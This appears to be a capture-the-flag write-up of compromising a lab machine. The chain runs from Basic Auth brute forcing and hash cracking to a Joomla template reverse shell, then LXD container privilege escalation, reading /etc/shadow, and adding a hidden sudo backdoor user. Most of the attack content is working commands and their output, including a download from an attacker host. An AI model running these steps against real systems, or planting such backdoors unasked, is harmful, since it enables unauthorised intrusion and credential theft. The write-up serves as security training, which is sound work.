## Reconnaissance

I started with a standard port scan to identify active services:

```bash
nmap -sS -sC -sV -O -Pn -p 22,80,8080 <TARGET_IP>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.41
```

Three ports grabbed my attention: SSH, HTTP on port 80, and HTTP on port 8080 (which returned a 401 Unauthorized with Basic Auth). The 8080 port immediately stood out as the primary target.

## Enumeration & Discovery

### Port 8080 — Basic Auth Bruteforce

I started with a dictionary attack against the Basic Auth realm on port 8080:

```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get / -s 8080

[8080][http-get] host: <TARGET_IP>   login: joker   password: hannah
```

The credentials `joker:hannah` unlocked access to what turned out to be a Joomla installation.

### Discovering the Backup File

Once authenticated, I enumerated the 8080 site and found a `backup.zip` file containing the Joomla database and configuration:

```bash
gobuster dir -u http://<TARGET_IP>:8080/ -w /usr/share/wordlists/dirb/common.txt -U joker -P hannah -x html,php,txt,js,json,bak,old,zip -b 400,403,404

/backup.zip (~12 MB) — fichero clave
/administrator/index.php — Joomla admin panel
```

I downloaded and cracked the zip:

```bash
curl -u joker:hannah http://<TARGET_IP>:8080/backup.zip -o backup.zip
zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash

backup.zip:hannah
```

The zip password was `hannah`—same as the Basic Auth credential. A common pattern in CTF environments.

### Extracting Admin Credentials

Inside the backup, I found `configuration.php` with database credentials and `joomladb.sql` containing password hashes:

```bash
cat backup_extracted/site/configuration.php | grep -E 'user|password'

public $user = 'joomla';
public $password = '1234';
```

More importantly, I found the admin account hash in the database dump:

```bash
grep admin backup_extracted/db/joomladb.sql | tail

INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',[...])
```

I cracked the bcrypt hash:

```bash
echo 'admin:$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > joomla_admin.hash
john --wordlist=/usr/share/wordlists/rockyou.txt joomla_admin.hash

admin:abcd1234
```

## Initial Access — RCE via Joomla Template

With admin credentials in hand, I logged into the Joomla admin panel at `http://<TARGET_IP>:8080/administrator/`:

```bash
curl -u joker:hannah "http://<TARGET_IP>:8080/administrator/"
```

I navigated to **Sistema → Site Templates → Protostar** and edited the `error.php` template file, replacing its contents with a PHP reverse shell (pentestmonkey's php-reverse-shell):

```bash
# Set listener on attacker machine
nc -lvnp <ATTACKER_PORT>

# Trigger the shell by accessing the modified template
curl -u joker:hannah "http://<TARGET_IP>:8080/templates/protostar/error.php"
```

The reverse shell connected successfully:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

I stabilized the shell immediately:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

Notice the critical detail: `www-data` is a member of the `lxd` group (115). This is the entire game right there.

## Privilege Escalation — LXD Exploit with Snap Bypass

The standard LXD privesc path usually works straightforwardly, but here I hit a snap-related blocker. The `lxc` client (which is a snap wrapper) failed with:

```bash
lxc version

Sorry, home directories outside of /home needs configuration.
See https://forum.snapcraft.io/t/11209 for details.
```

**The breakthrough:** Instead of fighting the snap wrapper, I invoked the real `lxc` binary directly:

```bash
export LXD_DIR=/var/snap/lxd/common/lxd
/snap/lxd/current/bin/lxc version

Client version: 4.0.10
Server version: 4.0.10
```

With the client working, I proceeded with the standard LXD privesc:

1. **Transfer Alpine image** from my attacker machine:

```bash
# On attacker
python3 -m http.server 8000

# On victim
wget http://<ATTACKER_IP>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz -O /tmp/alpine.tar.gz
```

2. **Import and create privileged container:**

```bash
/snap/lxd/current/bin/lxc image import /tmp/alpine.tar.gz --alias myimage
/snap/lxd/current/bin/lxc init myimage privesc -c security.privileged=true
/snap/lxd/current/bin/lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
/snap/lxd/current/bin/lxc start privesc
/snap/lxd/current/bin/lxc exec privesc /bin/sh
```

3. **Verify root inside container:**

```
~ # id
uid=0(root) gid=0(root)
```

4. **Access host filesystem:**

```bash
cd /mnt/root/root
# Full read/write access to the host's /root directory and all files
```

## Post-Exploitation

With root access inside the container and the host filesystem mounted at `/mnt/root/`, I could pivot to actual root on the host system. The most common approaches are chroot-based filesystem takeover or creating persistence mechanisms.

### Filesystem Access via chroot

```bash
chroot /mnt/root /bin/bash
cat /etc/shadow

root:$6$MqnFt1lH$mcm/o4EbYqXB9mOugnzATaLgRQr9RIy.2f98XeV/S5II50l1CR0PPGWB8[...]
joker:$6$R7BWQD7R$bayvJ4xt3ziEUe.W4f5JEzESO2KbCAHE.Tt5UECVijDxVM[...]
```

With `chroot`, I'm now operating as root directly on the host's filesystem. I can read sensitive files like `/etc/shadow` that would be inaccessible from a regular shell.

### Creating Persistence — New User with Sudo

A stealthier approach than modifying root's password:

```bash
useradd -m -s /bin/bash attacker
echo 'attacker:password123' | chpasswd
usermod -aG sudo attacker

# Exit container and verify
exit
su - attacker
sudo su -

# Confirm root access
id
uid=0(root) gid=0(root) groups=0(root)
```

This creates a backdoor user account that can escalate to root via `sudo` without modifying the root password itself—a technique that's harder for defenders to detect than obvious password changes.

## Key Takeaways

**Credential reuse is ubiquitous** — The same password (`hannah`) appeared in Basic Auth, the zip file, and across multiple services. Always retry credentials discovered at one layer in other layers.

**Snap wrappers can silently break client tools** — When the standard `lxc` command fails, the real binary lives in `/snap/<package>/current/bin/`. Environment variables like `LXD_DIR` often provide the bypass without resorting to complex workarounds.

**Group membership is privilege** — The `lxd` group doesn't grant traditional sudo-like permissions, but it grants the ability to talk to the LXD daemon. This is as powerful as root because LXD containers can mount the host filesystem with full privileges.

**Always verify group memberships in shell access** — The `id` command reveals `groups=...` immediately. Before escalating, check what privileged groups the current user belongs to—they might open direct paths to root.
